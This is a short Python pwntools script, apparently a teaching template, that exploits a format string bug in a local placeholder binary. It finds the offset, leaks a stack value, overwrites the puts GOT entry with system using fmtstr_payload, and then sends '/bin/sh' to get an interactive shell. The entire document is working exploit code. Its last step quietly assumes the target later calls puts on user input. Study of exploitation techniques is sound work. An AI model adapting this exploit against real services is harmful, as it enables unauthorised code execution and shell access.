#!/usr/bin/env python3
"""
Example: Format String Exploitation

This example demonstrates format string exploitation with pwntools.
"""

from pwn import *

# Configuration
context(arch='amd64', os='linux', log_level='info')
BINARY = './binary'

def exploit():
    # Load binary
    elf = ELF(BINARY)
    print(f"[*] Binary: {BINARY}")

    # Define leak function
    def exec_fmt(payload):
        p = process(BINARY)
        p.sendline(payload)
        return p.recvall()

    # Find format string offset
    print("[*] Finding format string offset...")
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    print(f"[+] Format string offset: {offset}")

    # Leak information
    print("[*] Leaking information...")
    payload = b'%' + str(offset).encode() + b'$p'
    p = process(BINARY)
    p.sendline(payload)
    leaked = int(p.recvline().strip(), 16)
    print(f"[+] Leaked value: {hex(leaked)}")

    # Write to memory
    print("[*] Writing to memory...")
    target_addr = elf.got['puts']
    value = elf.symbols['system']
    payload = fmtstr_payload(offset, {target_addr: value})
    print(f"[+] Payload size: {len(payload)}")

    # Send exploit
    print("[*] Sending exploit...")
    p = process(BINARY)
    p.sendline(payload)

    # Interact
    print("[*] Interacting with shell...")
    p.sendline(b'/bin/sh')
    p.interactive()

if __name__ == '__main__':
    exploit()
